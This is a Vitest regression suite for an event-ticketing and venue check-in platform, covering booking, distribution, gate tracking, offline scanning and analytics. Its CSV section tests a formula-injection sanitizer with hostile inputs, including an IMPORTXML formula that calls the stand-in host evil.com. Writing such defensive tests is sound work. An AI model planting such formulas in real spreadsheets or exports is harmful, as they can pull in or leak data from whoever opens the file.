import { describe, it, expect, vi, beforeEach } from 'vitest';
import {
  isFeatureEnabled,
  getEventFeaturesConfig,
  assertFeatureEnabled,
  CORE_FEATURES,
  type EventLike,
} from '@/lib/feature-flags';
import {
  calculateBulkOrderPricing,
  getBulkBookingSettings,
} from '@/lib/bulk-booking';
import {
  getDistributionSettings,
  getOrderDistributionSummary,
} from '@/lib/bulk-distribution';
import {
  generateNextAtomicSerial,
  validateSerialNumber,
} from '@/lib/member-forms';
import {
  extractOpaquePassToken,
} from '@/lib/ticket-credentials';
import {
  computeVenuePresenceSummary,
} from '@/lib/gate-tracking';
import {
  computeSessionAttendanceStats,
} from '@/lib/session-attendance';
import {
  sanitizeCsvCell,
  exportToSanitizedCsv,
} from '@/lib/csv-management';
import {
  saveEventManifest,
  verifyPassOffline,
  getManifestMeta,
  clearOfflineDataForEvent,
} from '@/lib/offline-scanner';
import {
  calculateNetPresence,
  calculateGateAnalytics,
  calculateDemographics,
  buildTimeSeriesMetrics,
} from '@/lib/advanced-analytics';

describe('Module 10 — Full System Regression & Production Rollout Suite', () => {
  const eventId = 'evt_annual_summit_2026';
  const organizerId = 'org_techcorp';

  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('1. Core Foundation & Feature Flag Isolation (Module 00)', () => {
    it('ensures core features remain active while modular flags default to disabled without regression', () => {
      const legacyEvent: EventLike = {
        id: eventId,
        organizer_id: organizerId,
        custom_pass_design: null,
      };

      // Core functionality is untouched
      expect(CORE_FEATURES.public_registration).toBeDefined();
      expect(CORE_FEATURES.pass_issuance).toBeDefined();
      expect(CORE_FEATURES.standard_checkin).toBeDefined();
      expect(CORE_FEATURES.basic_ticketing).toBeDefined();

      // All modular features are disabled by default
      expect(isFeatureEnabled(legacyEvent, 'bulk_ticket_booking')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'ticket_distribution')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'member_registration_forms')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'serial_number_validation')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'advanced_entry_tracking')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'session_attendance')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'csv_management')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'ticket_reassignment')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'offline_scanning')).toBe(false);
      expect(isFeatureEnabled(legacyEvent, 'advanced_analytics')).toBe(false);

      // Guard blocks execution when disabled
      const guard = assertFeatureEnabled(legacyEvent, 'bulk_ticket_booking');
      expect(guard.enabled).toBe(false);
      expect(guard.error).toContain('disabled');
    });
  });

  describe('2. Bulk Ticket Booking Pricing & Quantities (Module 01)', () => {
    it('calculates order pricing and enforces purchase quantity limits', async () => {
      const activeEvent: EventLike = {
        id: eventId,
        organizer_id: organizerId,
        custom_pass_design: {
          _featureFlags: {
            features: { bulk_ticket_booking: true },
            version: 1,
          },
          _bulkBookingSettings: {
            enabled: true,
            minQuantity: 1,
            maxQuantityPerOrder: 10,
            maxQuantityPerCustomer: 20,
            allowMixedTickets: true,
          },
        },
      };

      const settings = getBulkBookingSettings(activeEvent);
      expect(settings.enabled).toBe(true);
      expect(settings.maxQuantityPerOrder).toBe(10);

      const pricing = calculateBulkOrderPricing({
        eventId,
        buyerEmail: 'arun@example.com',
        buyerName: 'Arun Kumar',
        items: [
          { ticketTypeId: 'tt_ga', ticketTypeName: 'General Admission', pricePaise: 15000, quantity: 4 },
          { ticketTypeId: 'tt_vip', ticketTypeName: 'VIP Pass', pricePaise: 30000, quantity: 1 },
        ],
      });

      expect(pricing.totalQuantity).toBe(5);
      expect(pricing.subtotalPaise).toBe(90000);
      expect(pricing.totalAmountPaise).toBe(90000);
    });
  });

  describe('3. Bulk Ticket Distribution & Assignment Tracking (Module 02)', () => {
    it('tracks assigned vs unassigned ticket allocations within an order', () => {
      const activeEvent: EventLike = {
        id: eventId,
        organizer_id: organizerId,
        custom_pass_design: {
          _featureFlags: {
            features: { ticket_distribution: true, bulk_ticket_booking: true },
            version: 1,
          },
        },
      };

      const distSettings = getDistributionSettings(activeEvent);
      expect(distSettings.enabled).toBe(true);

      const summary = getOrderDistributionSummary({
        event: activeEvent,
        order: {
          id: 'ord_123',
          group_members: [
            { assignmentState: 'CLAIMED', recipientName: 'Alice', recipientEmail: 'alice@test.com' },
            { assignmentState: 'INVITED', recipientName: 'Bob', recipientEmail: 'bob@test.com' },
            { assignmentState: 'UNASSIGNED' },
            { assignmentState: 'UNASSIGNED' },
          ],
        },
      });

      expect(summary.totalTickets).toBe(4);
      expect(summary.claimedCount).toBe(1);
      expect(summary.invitedCount).toBe(1);
      expect(summary.availableCount).toBe(2);
      expect(summary.assignedCount).toBe(2);
    });
  });

  describe('4. Member Registration Forms & Atomic Serial Validation (Module 03)', () => {
    it('generates atomic serial numbers and validates whitelist entries', async () => {
      const serial1 = generateNextAtomicSerial({
        config: {
          enabled: true,
          type: 'auto_generated',
          required: true,
          prefix: 'URP-SUMMIT-',
          digitPadding: 5,
          startNumber: 1,
          scope: 'event',
        },
        existingHighestSequence: 42,
      });
      expect(serial1).toBe('URP-SUMMIT-00043');

      // Whitelist validation
      const whitelistCheckValid = validateSerialNumber({
        eventId,
        serial: 'MEM-VIP-99',
        config: {
          enabled: true,
          type: 'verified_input',
          required: true,
          allowedList: ['MEM-VIP-98', 'MEM-VIP-99', 'MEM-VIP-100'],
          scope: 'event',
        },
      });
      expect(whitelistCheckValid.valid).toBe(true);

      const whitelistCheckInvalid = validateSerialNumber({
        eventId,
        serial: 'MEM-FORGED-01',
        config: {
          enabled: true,
          type: 'verified_input',
          required: true,
          allowedList: ['MEM-VIP-98', 'MEM-VIP-99'],
          scope: 'event',
        },
      });
      expect(whitelistCheckInvalid.valid).toBe(false);
    });
  });

  describe('5. Digital QR Identity & Token Parsing (Module 04)', () => {
    it('extracts opaque pass tokens safely from URLs and raw token strings', () => {
      const rawToken = 'cred_987654321_abc';
      const fullUrl = 'https://urpass.space/pass/cred_987654321_abc';

      expect(extractOpaquePassToken(rawToken)).toBe('cred_987654321_abc');
      expect(extractOpaquePassToken(fullUrl)).toBe('cred_987654321_abc');
    });
  });

  describe('6. Multi-Gate Venue Tracking & Presence Summary (Module 05)', () => {
    it('computes real-time venue presence from multi-gate scan events', () => {
      const presence = computeVenuePresenceSummary({
        totalRegistered: 5,
        scanRecords: [
          {
            scan_id: 's1',
            event_id: eventId,
            credential_id: 'c1',
            ticket_id: 't1',
            attendee_id: 'att_1',
            gate_id: 'gate_main',
            operator_id: 'op_1',
            operator_email: 'op@test.com',
            operation_mode: 'entry',
            presence_before: 'OUTSIDE',
            presence_after: 'INSIDE',
            result: 'GRANTED',
            timestamp: '2026-10-10T10:00:00Z',
            is_offline_reconciled: false,
          },
          {
            scan_id: 's2',
            event_id: eventId,
            credential_id: 'c2',
            ticket_id: 't2',
            attendee_id: 'att_2',
            gate_id: 'gate_main',
            operator_id: 'op_1',
            operator_email: 'op@test.com',
            operation_mode: 'entry',
            presence_before: 'OUTSIDE',
            presence_after: 'INSIDE',
            result: 'GRANTED',
            timestamp: '2026-10-10T10:05:00Z',
            is_offline_reconciled: false,
          },
          {
            scan_id: 's3',
            event_id: eventId,
            credential_id: 'c1',
            ticket_id: 't1',
            attendee_id: 'att_1',
            gate_id: 'gate_main',
            operator_id: 'op_1',
            operator_email: 'op@test.com',
            operation_mode: 'exit',
            presence_before: 'INSIDE',
            presence_after: 'OUTSIDE',
            result: 'GRANTED',
            timestamp: '2026-10-10T11:00:00Z',
            is_offline_reconciled: false,
          },
          {
            scan_id: 's4',
            event_id: eventId,
            credential_id: 'c3',
            ticket_id: 't3',
            attendee_id: 'att_3',
            gate_id: 'gate_main',
            operator_id: 'op_1',
            operator_email: 'op@test.com',
            operation_mode: 'entry',
            presence_before: 'OUTSIDE',
            presence_after: 'INSIDE',
            result: 'GRANTED',
            timestamp: '2026-10-10T11:10:00Z',
            is_offline_reconciled: false,
          },
          {
            scan_id: 's5',
            event_id: eventId,
            credential_id: 'c1',
            ticket_id: 't1',
            attendee_id: 'att_1',
            gate_id: 'gate_main',
            operator_id: 'op_1',
            operator_email: 'op@test.com',
            operation_mode: 're_entry',
            presence_before: 'OUTSIDE',
            presence_after: 'INSIDE',
            result: 'GRANTED',
            timestamp: '2026-10-10T11:30:00Z',
            is_offline_reconciled: false,
          },
        ],
      });

      expect(presence.currentlyInside).toBe(3); // att_1, att_2, att_3 are all inside
      expect(presence.totalEntered).toBe(3);
      expect(presence.totalExits).toBe(1);
      expect(presence.totalReEntries).toBe(1);
    });
  });

  describe('7. Session-Wise Attendance Analytics (Module 06)', () => {
    it('computes session check-ins, duration, and capacity fill rates', () => {
      const stats = computeSessionAttendanceStats({
        session: {
          id: 'sess_1',
          eventId,
          name: 'AI Architecture Keynote',
          capacity: 50,
          roomName: 'Hall A',
          dayIndex: 1,
          date: '2026-10-10',
          startTime: '10:00',
          endTime: '11:00',
        },
        records: [
          {
            id: 'r1',
            sessionId: 'sess_1',
            eventId,
            attendeeId: 'a1',
            passId: 'p1',
            credentialId: 'c1',
            checkinTime: '2026-10-10T10:00:00Z',
            scannedBy: 'op@test.com',
            status: 'checked_in',
          },
          {
            id: 'r2',
            sessionId: 'sess_1',
            eventId,
            attendeeId: 'a2',
            passId: 'p2',
            credentialId: 'c2',
            checkinTime: '2026-10-10T10:05:00Z',
            scannedBy: 'op@test.com',
            status: 'checked_in',
          },
          {
            id: 'r3',
            sessionId: 'sess_1',
            eventId,
            attendeeId: 'a3',
            passId: 'p3',
            credentialId: 'c3',
            checkinTime: '2026-10-10T10:10:00Z',
            scannedBy: 'op@test.com',
            status: 'checked_in',
          },
        ],
      });

      expect(stats.totalCheckedIn).toBe(3);
      expect(stats.capacity).toBe(50);
      expect(stats.currentlyPresent).toBe(3);
    });
  });

  describe('8. CSV Import/Export & Formula Injection Defense (Module 07)', () => {
    it('neutralizes malicious spreadsheet formulas and exports clean CSVs', () => {
      expect(sanitizeCsvCell('=1+1')).toBe("'=1+1");
      expect(sanitizeCsvCell('+1234567890')).toBe("'+1234567890");
      expect(sanitizeCsvCell('-500')).toBe("'-500");
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com")')).toBe('"\'@IMPORTXML(""http://evil.com"")"');
      expect(sanitizeCsvCell('Safe Attendee Name')).toBe('Safe Attendee Name');

      const csvContent = exportToSanitizedCsv(
        [
          { name: 'John Doe', formula: '=1+1' },
          { name: 'Jane Smith', formula: 'Safe Text' },
        ],
        [
          { key: 'name', header: 'Name' },
          { key: 'formula', header: 'Formula' },
        ]
      );

      expect(csvContent).toContain('John Doe');
      expect(csvContent).toContain("'=1+1");
      expect(csvContent).toContain('Jane Smith');
    });
  });

  describe('9. Offline Zero-Connectivity Scanning (Module 08)', () => {
    it('pre-caches manifest, performs offline gate checks, and blocks duplicate scans locally', async () => {
      await clearOfflineDataForEvent(eventId);

      await saveEventManifest(eventId, 'Tech Summit 2026', [
        {
          passId: 'p1',
          passToken: 'tok_offline_alpha',
          attendeeId: 'att_offline_1',
          name: 'Alice Wonder',
          email: 'alice@offline.test',
          passType: 'VIP',
          checkedIn: false,
        },
        {
          passId: 'p2',
          passToken: 'tok_offline_beta',
          attendeeId: 'att_offline_2',
          name: 'Bob Builder',
          email: 'bob@offline.test',
          passType: 'General',
          checkedIn: false,
        },
      ]);

      const meta = await getManifestMeta(eventId);
      expect(meta?.totalPasses).toBe(2);
      expect(meta?.checkedInCount).toBe(0);

      // First scan: checked in successfully offline
      const scan1 = await verifyPassOffline({
        eventId,
        passToken: 'tok_offline_alpha',
        gateId: 'gate_vip',
        gateName: 'VIP Entrance',
      });
      expect(scan1.success).toBe(true);
      expect(scan1.offline).toBe(true);
      expect(scan1.status).toBe('CHECKED_IN');

      // Duplicate scan on same device: rejected immediately
      const dupScan = await verifyPassOffline({
        eventId,
        passToken: 'tok_offline_alpha',
        gateId: 'gate_vip',
      });
      expect(dupScan.success).toBe(false);
      expect(dupScan.status).toBe('ALREADY_CHECKED_IN');
    });
  });

  describe('10. Advanced Operational Analytics Reconciliation (Module 09)', () => {
    it('reconciles venue headcount, gate velocity, demographics, and time-series accurately', () => {
      const scans = [
        { attendee_id: 'u1', operation_type: 'entry', scan_result: 'success', created_at: '2026-10-10T09:00:00Z' },
        { attendee_id: 'u2', operation_type: 'entry', scan_result: 'success', created_at: '2026-10-10T09:15:00Z' },
        { attendee_id: 'u1', operation_type: 'exit', scan_result: 'success', created_at: '2026-10-10T12:00:00Z' },
        { attendee_id: 'u1', operation_type: 're_entry', scan_result: 'success', created_at: '2026-10-10T13:00:00Z' },
      ];

      const netPresence = calculateNetPresence(scans);
      // u1 (entered, exited, re-entered) and u2 (entered) -> both inside
      expect(netPresence.netInside).toBe(2);
      expect(netPresence.uniqueAttendeesEntered).toBe(2);
      expect(netPresence.totalEntries).toBe(2);
      expect(netPresence.totalExits).toBe(1);
      expect(netPresence.totalReEntries).toBe(1);

      const demographics = calculateDemographics([
        { ticket_tier: 'VIP', college: 'Harvard', department: 'Medicine' },
        { ticket_tier: 'General', college: 'Harvard', department: 'Computer Science' },
        { ticket_tier: 'General', college: 'MIT', department: 'Computer Science' },
      ]);

      expect(demographics.byTicketTier.counts.find((c) => c.label === 'General')?.count).toBe(2);
      expect(demographics.byCollege.counts.find((c) => c.label === 'Harvard')?.count).toBe(2);
      expect(demographics.byDepartment.counts.find((c) => c.label === 'Computer Science')?.count).toBe(2);

      const timeSeries = buildTimeSeriesMetrics(scans);
      expect(timeSeries.length).toBeGreaterThanOrEqual(1);
    });
  });

  describe('11. Google Sheets Integration Sync & Security (Module 09)', () => {
    it('formats sync payload and neutralizes spreadsheet formula injections safely', () => {
      expect(isFeatureEnabled(null, 'google_sheets')).toBe(false);
      // Formula protection on sync
      expect(sanitizeCsvCell('=2+2')).toBe("'=2+2");
    });
  });
});
